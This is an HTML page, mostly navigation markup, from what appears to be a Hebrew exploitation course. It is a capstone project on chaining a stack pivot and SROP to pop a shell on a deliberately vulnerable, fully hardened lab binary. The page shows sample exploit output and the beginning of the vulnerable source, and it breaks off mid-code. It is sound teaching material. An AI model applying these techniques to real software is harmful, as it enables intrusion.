+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../5%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%9E%D7%97%D7%A8%D7%95%D7%96%D7%AA%20%D7%A4%D7%95%D7%A8%D7%9E%D7%98/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5   חולשות מחרוזת פורמט
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_8" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_8" id="__nav_7_2_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6   ROP מתקדם
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_2_8_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    6   ROP מתקדם
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../6.1%20-%20stack%20pivoting/6.1%20-%20stack%20pivoting%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.1   stack pivoting
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../6.2%20-%20ret2csu/6.2%20-%20ret2csu%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.2   ret2csu
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../6.3%20-%20SROP/6.3%20-%20SROP%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.3   SROP
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../6.4%20-%20ret2dlresolve/6.4%20-%20ret2dlresolve%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.4   ret2dlresolve
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_8_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_8_5" id="__nav_7_2_8_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.5   פרויקט שרשרת ROP מורכבת
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_8_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_8_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    6.5   פרויקט שרשרת ROP מורכבת
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.5 - פרויקט שרשרת ROP מורכבת - פרויקט
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.5 - פרויקט שרשרת ROP מורכבת - פרויקט
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#-chain-rop-srop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פרויקט - chain ROP מורכבת: פיבוט ו-SROP
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מה בונים ומה המטרה
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-protections" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הנחות הגנה - protections
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-vulnerable-binary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        קוד המקור של הבינארי - vulnerable binary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אימות ההגנות והגאדג'טים
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        התוכנית ההתקפית
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-requirements" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        דרישות הפרויקט - requirements
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-milestones" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אבני דרך - milestones
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="אבני דרך - milestones">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אבן דרך 1 - הגנות והיסטים
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-leak-pie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אבן דרך 2 - leak של PIE וחישוב הבסיס
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-leak-canary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אבן דרך 3 - leak של הcanary
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-srop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אבן דרך 4 - פיבוט וירי SROP
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-exploit-starting-skeleton" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שלד ה-exploit - starting skeleton
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-ret2csu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        נתיב חלופי - ret2csu
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#full-relro-ret2dlresolve" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        המגבלה של Full RELRO על ret2dlresolve
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-common-pitfalls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מלכודות נפוצות - common pitfalls
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-stretch-goals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרות מתיחה - stretch goals
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-reference-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון ייחוס - reference exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        קריטריוני הצלחה והגשה
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7   ניצול הHeap
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../8%20-%20%D7%94%D7%A0%D7%93%D7%A1%D7%94%20%D7%94%D7%A4%D7%95%D7%9B%D7%94%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8   הנדסה הפוכה לניצול
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../9%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%95%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%99%D7%9D/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9   ניצול קרנל ואתגרים מתקדמים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../10%20-%20%D7%9E%D7%A6%D7%99%D7%90%D7%AA%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%90%D7%9E%D7%99%D7%AA%D7%99%D7%95%D7%AA/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10   מציאת חולשות אמיתיות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-GPU/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות GPU
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#-chain-rop-srop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פרויקט - chain ROP מורכבת: פיבוט ו-SROP
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מה בונים ומה המטרה
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-protections" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הנחות הגנה - protections
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-vulnerable-binary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        קוד המקור של הבינארי - vulnerable binary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אימות ההגנות והגאדג'טים
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        התוכנית ההתקפית
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-requirements" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        דרישות הפרויקט - requirements
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-milestones" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אבני דרך - milestones
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="אבני דרך - milestones">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אבן דרך 1 - הגנות והיסטים
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-leak-pie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אבן דרך 2 - leak של PIE וחישוב הבסיס
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-leak-canary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אבן דרך 3 - leak של הcanary
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-srop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אבן דרך 4 - פיבוט וירי SROP
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-exploit-starting-skeleton" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שלד ה-exploit - starting skeleton
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-ret2csu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        נתיב חלופי - ret2csu
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#full-relro-ret2dlresolve" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        המגבלה של Full RELRO על ret2dlresolve
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-common-pitfalls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מלכודות נפוצות - common pitfalls
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-stretch-goals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרות מתיחה - stretch goals
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-reference-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        פתרון ייחוס - reference exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        קריטריוני הצלחה והגשה
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="ניווט" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    דף הבית
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר ו-Low Level
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר חולשות
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../6.1%20-%20stack%20pivoting/6.1%20-%20stack%20pivoting%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    6   ROP מתקדם
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    6.5   פרויקט שרשרת ROP מורכבת
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>6.5 - פרויקט שרשרת ROP מורכבת - פרויקט</h1>
+
+<h2 id="-chain-rop-srop">פרויקט - chain ROP מורכבת: פיבוט ו-SROP<a class="headerlink" href="#-chain-rop-srop" title="Permanent link">&para;</a></h2>
+<p>לאורך פרק 6 פירקנו את הטכניקות המתקדמות של ROP אחת-אחת: הזזת מחסנית - stack pivot, הגאדג'ט האוניברסלי ret2csu, קריאת סיגנל מזויפת - SROP, ופתרון סמלים בכוח - ret2dlresolve. עד עכשיו כל טכניקה הודגמה על בינארי שנבנה בדיוק בשבילה, לרוב עם כמה הגנות כבויות כדי שנוכל להתרכז ברעיון. עכשיו הגיע הרגע לחבר הכל. בפרויקט הזה תקבלו בינארי אחד קשוח - Full RELRO, NX, PIE, canary, וחלון overflow זעיר - שבו אף טכניקה בודדת לא מספיקה. תצטרכו לשרשר כמה מהן: פיבוט שמעביר אתכם לאזור עבודה גדול, ומעליו אחת מהטכניקות שמייצרת shell בלי שום כתובת libc קבועה. זה בדיוק סוג האתגר שתפגשו ב-CTF רציני ובעבודת מחקר אמיתית.</p>
+<h2 id="_1">מה בונים ומה המטרה<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>תקבלו קוד מקור של בינארי קטן, תקמפלו אותו עם כל ההגנות דלוקות, ותכתבו exploit שפותח shell אינטראקטיבי. הקריטריון להצלחה חד משמעי:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$ python3 exploit.py
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>[+] stage    @ 0x5637b1c2e040
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>[+] PIE base @ 0x5637b1c2c000
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>[+] canary   @ 0x8f3a1e77c4b90600
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>[*] pivot -&gt; stage, firing SROP frame
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>[*] Switching to interactive mode
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>$ id
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>$ cat flag.txt
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>VR{pivot_plus_srop_needs_no_libc_at_all}
+</code></pre></div>
+<p>שימו לב לפרט אחד קריטי בפלט: אין שם שורת "libc זוהתה". בניגוד לפרויקט של פרק 4, כאן ה-exploit לא מדליף שום כתובת libc ולא תלוי בגרסת libc בכלל. זו לא במקרה - זו כל הנקודה של הנתיב שנבחר. הטכניקה SROP מאפשרת לבצע <code>execve("/bin/sh", 0, 0)</code> ישירות דרך קריאת מערכת, בלי לדעת איפה libc יושבת ובלי בכלל להיזקק לה.</p>
+<h2 id="-protections">הנחות הגנה - protections<a class="headerlink" href="#-protections" title="Permanent link">&para;</a></h2>
+<p>לפני שכותבים שורת exploit אחת חייבים לדעת בדיוק נגד מה עומדים. הבינארי מקומפל כך שכל ההגנות דלוקות, וזה מה שהופך אותו לקשה:</p>
+<ul>
+<li><strong>מנגנון NX</strong> דלוק. המחסנית לא ניתנת להרצה, ולכן injection של shellcode לא באה בחשבון. כל הפתרון הוא ROP טהור.</li>
+<li><strong>מנגנון PIE</strong> דלוק. גם הבינארי עצמו נטען בכתובת אקראית, ולכן אין שום כתובת קוד או נתונים קבועה. חייבים לדלוף לפחות כתובת אחת מהבינארי כדי לחשב את הבסיס שלו.</li>
+<li><strong>קנרי - canary</strong> דלוק (מקמפלים עם <code>-fstack-protector-all</code>). כל overflow שמגיעה מעבר לbuffer אל return address חוצה את הcanary, וחייבת לכתוב אותו נכון בחזרה - אחרת התוכנית מתה ב-<code>__stack_chk_fail</code>. לכן נצטרך גם leak של canary.</li>
+<li><strong>מנגנון RELRO</strong> במצב Full. ה-GOT נכתב פעם אחת בטעינה והופך לקריאה בלבד. אי אפשר לדרוס אותו, וכפי שנראה בהמשך - זה גם מה שמוציא מהמשחק את ret2dlresolve הקלאסי.</li>
+<li><strong>חלון overflow זעיר.</strong> הקריאה הvulnerable נותנת לכם לדרוס בדיוק את הcanary, את ה-<code>saved rbp</code>, ואת return address - ואפס בתים אחריהם. אין מקום לchain. זו הסיבה שאתם חייבים פיבוט.</li>
+</ul>
+<p>התמונה ברורה: יש כאן canary לדלוף, בסיס PIE לדלוף, חלון overflow שבו נכנס רק פיבוט אחד, ואזור עבודה גדול וכתיב שאליו נזיז את המחסנית. מכאן בונים את chain המטרה בנחת.</p>
+<h2 id="-vulnerable-binary">קוד המקור של הבינארי - vulnerable binary<a class="headerlink" href="#-vulnerable-binary" title="Permanent link">&para;</a></h2>
+<p>הנה הבינארי המלא. שמרו אותו כ-<code>chain.c</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1">// chain.c - chapter 6 capstone: pivot + SROP</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1">// Build (Full RELRO, NX, PIE, Canary):</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c1">//   gcc -O0 -fstack-protector-all -fpie -pie \</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1">//       -Wl,-z,relro,-z,now -o chain chain.c</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c1">// Guaranteed gadgets. In a dynamic binary there is no exposed syscall instruction in .text</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="c1">// (system calls go through libc), and a clean pop rax does not always exist either.</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="c1">// So we pin them at a fixed address (relative to the PIE base), exactly like</span>
